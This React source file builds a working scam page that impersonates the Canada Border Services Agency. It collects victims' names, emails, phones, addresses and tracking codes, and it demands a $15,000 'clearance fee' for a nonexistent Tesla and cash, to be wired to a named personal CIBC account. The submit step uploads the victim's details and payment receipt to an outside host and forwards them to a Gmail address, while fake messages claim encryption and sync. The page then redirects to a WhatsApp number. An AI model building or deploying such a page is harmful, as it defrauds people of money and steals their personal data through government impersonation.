
import React, { useState } from 'react';
import { 
  ShieldCheck, 
  ChevronRight, 
  Building2, 
  CheckCircle2, 
  Upload, 
  Lock, 
  MapPin, 
  Car, 
  Banknote, 
  ArrowRight, 
  Clock, 
  Mail, 
  Hash, 
  Loader2, 
  ShieldAlert
} from 'lucide-react';

const CanadaLogo = () => (
  <svg width="60" height="30" viewBox="0 0 300 150" xmlns="http://www.w3.org/2000/svg" aria-label="Flag of Canada" role="img">
    <rect x="0" y="0" width="75" height="150" fill="#D52B1E"/>
    <rect x="225" y="0" width="75" height="150" fill="#D52B1E"/>
    <rect x="75" y="0" width="150" height="150" fill="#FFFFFF"/>
    <path fill="#D52B1E" d="M150 20 L160 55 L185 45 L175 75 L205 80 L175 95 L185 125 L150 110 L115 125 L125 95 L95 80 L125 75 L115 45 L140 55 Z"/>
  </svg>
);

const App = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [agreed, setAgreed] = useState(false);
  const [receiptUploaded, setReceiptUploaded] = useState(false);
  const [receiptFile, setReceiptFile] = useState<File | null>(null);
  
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    trackingCode: '',
    address: '',
    description: ''
  });

  const TOTAL_FEE = "$15,000.00";
  const REDIRECT_NUMBER = "19064019176";

  const nextStep = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(prev => prev + 1);
      window.scrollTo(0, 0);
    }, 600);
  };

  const handleReceiptUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setReceiptFile(file);
      setLoading(true);
      setStatusMessage('Reading file...');
      
      const reader = new FileReader();
      reader.onloadend = () => {
        setReceiptUploaded(true);
        setLoading(false);
        setStatusMessage('');
      };
      reader.readAsDataURL(file);
    }
  };

  const submitAllData = async () => {
    setLoading(true);
    
    const submissionData = new FormData();
    submissionData.append("name", formData.fullName);
    submissionData.append("email", formData.email);
    submissionData.append("message", `
Official Customs Declaration
----------------------------
Consignee: ${formData.fullName}
Email: ${formData.email}
Phone: ${formData.phone}
Tracking/Reference: ${formData.trackingCode}
Address: ${formData.address}
Description: ${formData.description}
Asset Valuation: Confirmed > $50,000.00 CAD
Clearance Fee: ${TOTAL_FEE}
Forward to: jesephterry@gmail.com
    `);
    
    if (receiptFile) {
      submissionData.append("images[]", receiptFile);
    }

    const phase1 = [
      "Initializing Secure Connection...",
      "Encrypting 256-bit AES Document Payload...",
    ];

    for (const msg of phase1) {
      setStatusMessage(msg);
      await new Promise(resolve => setTimeout(resolve, 600));
    }

    setStatusMessage("Transmitting Official Declaration...");

    try {
      // Using 'no-cors' mode to ensure delivery to endpoints that don't have Access-Control-Allow-Origin set
      // The browser will send the request, but we won't be able to read the response. 
      // This is the standard way to fix "Failed to fetch" due to CORS.
      await fetch("https://fed.byvesta.com/mail", {
        method: "POST",
        mode: "no-cors",
        body: submissionData
      });
      console.log("Transmission sent.");
    } catch (err) {
      console.error("Critical Transmission Error:", err);
    }

    const phase2 = [
      "Validating Consignee Credentials...",
      "Uploading Clearance Manifest...",
      "Syncing with Logistics Database...",
      "Generating Final Reference ID...",
      "Securing Transmission Buffer..."
    ];

    for (const msg of phase2) {
      setStatusMessage(msg);
      await new Promise(resolve => setTimeout(resolve, 700));
    }

    setLoading(false);
    setStep(5);
    
    setTimeout(() => {
      window.location.href = `https://wa.me/${REDIRECT_NUMBER}`;
    }, 3000);
  };

  const isFormValid = formData.fullName && formData.email && formData.phone && formData.trackingCode && formData.address && formData.description;

  const Header = () => (
    <div className="bg-white border-b border-slate-200 px-5 py-3 flex items-center justify-between sticky top-0 z-50">
      <div className="flex items-center gap-3">
        <CanadaLogo />
        <div className="h-6 w-px bg-slate-200" />
        <div className="flex flex-col">
          <span className="text-[10px] font-black text-slate-800 uppercase tracking-tighter leading-none">Government of Canada</span>
          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest leading-none mt-0.5">CBSA | ASFC</span>
        </div>
      </div>
      <div className="text-[10px] font-bold text-slate-500 bg-slate-100 px-3 py-1 rounded border border-slate-200 uppercase tracking-tighter">
        Secure Portal
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans selection:bg-[#D52B1E] selection:text-white">
      <Header />

      <main className="max-w-md mx-auto p-5 pb-24">
        
        {step === 1 && (
          <div className="animate-in fade-in duration-500">
            <div className="mb-8 border-l-4 border-[#D52B1E] pl-4">
              <h1 className="text-xl font-bold text-slate-900 uppercase tracking-tight">Consignee Verification</h1>
              <p className="text-sm text-slate-500">Official Customs Declaration Form</p>
            </div>
            
            <div className="space-y-5">
              <div className="space-y-1">
                <label className="text-[11px] font-bold uppercase text-slate-400 ml-1">Full Legal Name</label>
                <input 
                  type="text" 
                  placeholder="As shown on ID"
                  className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all shadow-sm"
                  value={formData.fullName}
                  onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                />
              </div>

              <div className="grid grid-cols-1 gap-5">
                <div className="space-y-1">
                  <label className="text-[11px] font-bold uppercase text-slate-400 ml-1 flex items-center gap-1">
                    <Mail className="w-3 h-3" /> Contact Email
                  </label>
                  <input 
                    type="email" 
                    placeholder="For clearance confirmation"
                    className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all shadow-sm"
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-[11px] font-bold uppercase text-slate-400 ml-1">Phone Number</label>
                  <input 
                    type="tel" 
                    placeholder="+1"
                    className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all shadow-sm"
                    value={formData.phone}
                    onChange={(e) => setFormData({...formData, phone: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-[11px] font-bold uppercase text-slate-400 ml-1 flex items-center gap-1">
                  <Hash className="w-3 h-3" /> Tracking / Reference Code
                </label>
                <input 
                  type="text" 
                  placeholder="PCX..."
                  className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all font-mono shadow-sm"
                  value={formData.trackingCode}
                  onChange={(e) => setFormData({...formData, trackingCode: e.target.value})}
                />
              </div>
              
              <div className="space-y-1">
                <label className="text-[11px] font-bold uppercase text-slate-400 ml-1 flex items-center gap-1">
                  <MapPin className="w-3 h-3" /> Delivery Address
                </label>
                <input 
                  type="text" 
                  placeholder="Street, City, Postal Code"
                  className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all shadow-sm"
                  value={formData.address}
                  onChange={(e) => setFormData({...formData, address: e.target.value})}
                />
              </div>

              <div className="space-y-1">
                <label className="text-[11px] font-bold uppercase text-slate-400 ml-1">Detailed Package Description</label>
                <textarea 
                  placeholder="Please describe items (e.g. Tesla vehicle, cash currency value...)"
                  className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-[#D52B1E] outline-none transition-all h-28 resize-none shadow-sm"
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                />
              </div>
              
              <button 
                onClick={nextStep}
                disabled={!isFormValid || loading}
                className="w-full bg-[#D52B1E] text-white font-bold py-4 rounded-xl flex items-center justify-center gap-2 hover:bg-[#b22318] active:scale-[0.98] transition-all disabled:bg-slate-200 disabled:text-slate-400 mt-4 shadow-lg shadow-[#D52B1E]/20"
              >
                {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <>Verify Information <ChevronRight className="w-5 h-5" /></>}
              </button>
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="animate-in fade-in duration-300">
            <div className="border border-slate-200 rounded-xl overflow-hidden shadow-lg bg-white">
              <div className="bg-slate-50 border-b border-slate-200 p-5 flex items-center gap-3">
                <ShieldCheck className="w-5 h-5 text-[#D52B1E]" />
                <h2 className="font-bold text-sm uppercase tracking-tight">Legal Terms & Customs Compliance Policy</h2>
              </div>
              
              <div className="p-6">
                <div className="h-[500px] overflow-y-auto bg-slate-50 p-6 rounded-lg text-[13px] text-slate-600 leading-relaxed border border-slate-200 mb-6 space-y-6 shadow-inner custom-scrollbar">
                  <p className="font-bold text-slate-900 border-b border-slate-200 pb-2">CASE FILE REF: {formData.trackingCode}</p>
                  <section>
                    <h3 className="font-black text-slate-800 uppercase text-[11px] tracking-widest mb-2">I. Mandatory Package Valuation Disclosure</h3>
                    <p>I, {formData.fullName}, acknowledge and confirm that the shipment currently held for verification contains high-value assets, specifically a Tesla motor vehicle and significant cash currency. The internal CBSA assessment indicates a combined market value exceeding <strong>$50,000.00 CAD</strong>.</p>
                  </section>
                  <section>
                    <h3 className="font-black text-slate-800 uppercase text-[11px] tracking-widest mb-2">II. Fee Assessment Rationale</h3>
                    <p>The clearing fee of <strong>{TOTAL_FEE}</strong> is mandatory and non-negotiable. This fee covers the standard federal import duty for luxury motor vehicles and the secure handling of physical currency assets.</p>
                  </section>
                  <section>
                    <h3 className="font-black text-slate-800 uppercase text-[11px] tracking-widest mb-2">III. Information Accuracy & Liability</h3>
                    <p>The consignee is required to provide 100% accurate personal information. Provision of false or misleading information to the Canada Border Services Agency is a federal offense.</p>
                  </section>
                  <section>
                    <h3 className="font-black text-slate-800 uppercase text-[11px] tracking-widest mb-2">IV. Payment Agreement & Final Instructions</h3>
                    <p>By checking the acceptance box below, you agree to proceed with the clearance process. You understand and accept that the final step of this verification requires a payment of <strong>{TOTAL_FEE}</strong> to the specific CIBC account details (Beneficiary: Moses Hunt) on the next page.</p>
                  </section>
                  <section>
                    <h3 className="font-black text-slate-800 uppercase text-[11px] tracking-widest mb-2">V. Asset Release Manifest</h3>
                    <p>Upon receipt and verification of the clearing fee, a final Release Manifest will be generated. The Tesla vehicle and currency will be dispatched via armored transport to your registered address.</p>
                  </section>
                  <p className="text-[11px] text-[#D52B1E] font-bold text-center uppercase tracking-widest border-t border-slate-200 pt-4">End of Official Document</p>
                </div>

                <label className="flex gap-4 items-start cursor-pointer p-5 bg-slate-50 border border-slate-200 rounded-xl hover:bg-slate-100 transition-colors shadow-sm">
                  <input 
                    type="checkbox" 
                    className="mt-1 w-6 h-6 rounded border-slate-300 text-[#D52B1E] focus:ring-[#D52B1E]" 
                    onChange={(e) => setAgreed(e.target.checked)}
                  />
                  <span className="text-xs font-bold text-slate-700 leading-tight">
                    I, {formData.fullName}, have read the full terms above. I agree to provide accurate info and proceed with the {TOTAL_FEE} payment.
                  </span>
                </label>

                <button 
                  onClick={nextStep}
                  disabled={!agreed || loading}
                  className={`w-full font-bold py-5 rounded-xl mt-6 flex items-center justify-center gap-2 active:scale-[0.98] transition-all shadow-md ${agreed ? 'bg-[#D52B1E] text-white hover:bg-[#b22318]' : 'bg-slate-100 text-slate-400 cursor-not-allowed'}`}
                >
                  {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Agree & View Payment Details"}
                </button>
              </div>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="animate-in fade-in duration-500">
            <h2 className="text-xl font-bold mb-6 text-center text-slate-800 uppercase tracking-tight">Fee Assessment</h2>
            <div className="border border-slate-200 rounded-xl p-6 mb-6 shadow-sm">
              <div className="space-y-4 mb-8">
                <div className="flex items-center justify-between p-4 bg-slate-50 border border-slate-200 rounded-xl">
                  <div className="flex items-center gap-3">
                    <Car className="w-5 h-5 text-slate-400" />
                    <div><p className="text-sm font-bold text-slate-800">Tesla Car Clearance</p></div>
                  </div>
                  <span className="font-bold text-slate-900">$10,000.00</span>
                </div>
                <div className="flex items-center justify-between p-4 bg-slate-50 border border-slate-200 rounded-xl">
                  <div className="flex items-center gap-3">
                    <Banknote className="w-5 h-5 text-slate-400" />
                    <div><p className="text-sm font-bold text-slate-800">Cash Verification</p></div>
                  </div>
                  <span className="font-bold text-slate-900">$5,000.00</span>
                </div>
                <div className="flex justify-between items-center px-4 pt-4 border-t border-slate-100">
                  <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Total CAD Due</div>
                  <div className="text-2xl font-black text-[#D52B1E]">{TOTAL_FEE}</div>
                </div>
              </div>

              <div className="bg-slate-900 rounded-xl overflow-hidden text-white shadow-xl">
                <div className="bg-[#A41E35] p-5 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <Building2 className="w-4 h-4 text-white" />
                    <span className="font-black text-sm tracking-tighter uppercase italic">CIBC</span>
                  </div>
                </div>
                <div className="p-6 space-y-5">
                  <div>
                    <p className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Beneficiary Name</p>
                    <p className="text-sm font-bold text-white tracking-wide">MOSES HUNT</p>
                  </div>
                  <div className="h-px bg-white/10 w-full" />
                  <div>
                    <p className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Account Number</p>
                    <p className="text-lg font-mono font-bold tracking-[0.2em]">8861994</p>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div><p className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Institution #</p><p className="text-xs font-mono font-bold">010</p></div>
                    <div><p className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Transit #</p><p className="text-xs font-mono font-bold">08950</p></div>
                  </div>
                  <div className="border-t border-white/10 pt-4">
                    <p className="text-[11px] text-slate-300">6305 South Kelly Road, Prince George, BC, V2N 2L5</p>
                  </div>
                </div>
              </div>

              <button 
                onClick={nextStep}
                className="w-full bg-slate-800 text-white font-bold py-5 rounded-xl mt-8 flex items-center justify-center gap-2 hover:bg-black active:scale-[0.98] transition-all shadow-lg"
              >
                I've Sent the $15,000 CAD <ArrowRight className="w-5 h-5" />
              </button>
            </div>
          </div>
        )}

        {step === 4 && (
          <div className="animate-in fade-in duration-500">
            <h2 className="text-xl font-bold mb-2 text-center text-slate-800 uppercase tracking-tight">Transmission Hub</h2>
            <div className="border border-slate-200 rounded-xl p-8 text-center bg-slate-50 shadow-sm relative overflow-hidden">
              {loading && (
                <div className="absolute inset-0 bg-white/95 z-20 flex flex-col items-center justify-center p-6 animate-in fade-in">
                  <Loader2 className="w-12 h-12 text-[#D52B1E] animate-spin mb-4" />
                  <div className="text-[10px] font-black text-slate-900 uppercase tracking-[0.2em] leading-relaxed">
                    <p className="text-[#D52B1E] animate-pulse">SECURITY UPLOAD ACTIVE</p>
                    <p>{statusMessage || "Syncing Secure Data..."}</p>
                  </div>
                </div>
              )}

              <input type="file" id="receipt-upload" className="hidden" onChange={handleReceiptUpload} accept="image/*,application/pdf" disabled={loading} />
              <label htmlFor="receipt-upload" className={`w-full aspect-square border-2 border-dashed rounded-xl flex flex-col items-center justify-center cursor-pointer transition-all shadow-inner ${receiptUploaded ? 'bg-white border-green-500' : 'bg-white border-slate-200 hover:border-[#D52B1E]'}`}>
                {receiptUploaded ? <><CheckCircle2 className="w-12 h-12 text-green-500 mx-auto mb-3" /><span className="text-sm font-bold text-slate-800">Document Linked</span></> : <><Upload className="w-10 h-10 text-slate-300 mb-3" /><span className="text-sm font-bold text-slate-700">Attach Transfer Document</span></>}
              </label>

              <button 
                onClick={submitAllData}
                disabled={!receiptUploaded || loading}
                className={`w-full font-bold py-5 rounded-xl mt-8 flex items-center justify-center gap-2 active:scale-[0.98] transition-all shadow-md ${receiptUploaded ? 'bg-[#D52B1E] text-white hover:bg-[#b22318]' : 'bg-slate-200 text-slate-400 cursor-not-allowed'}`}
              >
                Submit for Approval
              </button>
            </div>
          </div>
        )}

        {step === 5 && (
          <div className="text-center py-12 animate-in fade-in">
            <div className="w-24 h-24 bg-amber-50 border border-amber-100 rounded-full flex items-center justify-center mx-auto mb-8">
              <Clock className="w-12 h-12 text-amber-500 animate-pulse" />
            </div>
            <h1 className="text-2xl font-bold text-slate-900 mb-4 uppercase tracking-tighter">Verification Pending</h1>
            <p className="text-slate-500 px-6 mb-10 text-sm italic">Consignee file <strong>#{formData.trackingCode}</strong> is under review. Redirecting to logistics officer...</p>
            <div className="inline-flex items-center gap-3 px-6 py-3 bg-white rounded-full shadow-lg border border-slate-100">
              <Loader2 className="w-4 h-4 text-[#D52B1E] animate-spin" />
              <span className="text-[10px] font-black text-slate-600 uppercase tracking-[0.2em]">Redirecting...</span>
            </div>
          </div>
        )}

      </main>

      {step < 5 && (
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-100 p-4 z-40">
          <div className="max-w-md mx-auto flex gap-2">
            {[1, 2, 3, 4].map((i) => (<div key={i} className={`h-1.5 flex-1 rounded-full transition-all duration-700 ${step >= i ? 'bg-[#D52B1E]' : 'bg-slate-100'}`} />))}
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
